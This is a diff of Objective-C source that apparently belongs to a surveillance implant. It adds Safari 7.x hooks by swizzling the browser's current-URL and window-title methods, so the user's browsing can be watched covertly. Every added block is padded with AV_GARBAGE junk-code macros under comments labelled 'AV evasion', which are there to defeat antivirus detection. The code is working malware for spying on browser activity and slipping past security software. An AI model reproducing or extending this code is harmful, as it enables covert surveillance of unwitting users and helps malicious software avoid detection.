@@ -837,6 +837,35 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             // AV evasion: only on release build
             AV_GARBAGE_005
           }
+          
+          /*
+           * for Safari 7.x only
+           */
+          Class BrowserContentViewControllerObjCAdapterClass = objc_getClass("BrowserContentViewControllerObjCAdapter");
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_005
+          
+          if (BrowserContentViewControllerObjCAdapterClass != nil && BrowserWindowClass != nil)
+          {
+            // AV evasion: only on release build
+            AV_GARBAGE_007
+            
+            swizzleByAddingIMP (BrowserContentViewControllerObjCAdapterClass, @selector(expectedOrCurrentURL),
+                                class_getMethodImplementation(classSource, @selector(expectedOrCurrentURLHook)),
+                                @selector(expectedOrCurrentURLHook));
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_007
+            
+            swizzleByAddingIMP (BrowserWindowClass, @selector(setTitle:),
+                                class_getMethodImplementation(classSource, @selector(setTitleHook:)),
+                                @selector(setTitleHook:));
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_005
+          }
+
         }
       }
       else
@@ -1010,7 +1039,35 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             // AV evasion: only on release build
             AV_GARBAGE_005
           }
-
+          
+          /*
+           * for Safari 7.x only
+           */
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
+          Class BrowserContentViewControllerObjCAdapterClass = objc_getClass("BrowserContentViewControllerObjCAdapter");
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_005
+          
+          if (BrowserContentViewControllerObjCAdapterClass != nil && BrowserWindowClass != nil)
+          {
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            swizzleMethod(BrowserContentViewControllerObjCAdapterClass, @selector(expectedOrCurrentURL),
+                          BrowserContentViewControllerObjCAdapterClass, @selector(expectedOrCurrentURLHook));
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_007
+            
+            swizzleMethod(BrowserWindowClass, @selector(setTitle:),
+                          BrowserWindowClass, @selector(setTitleHook:));
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_007
+          }
         }
       }
       else
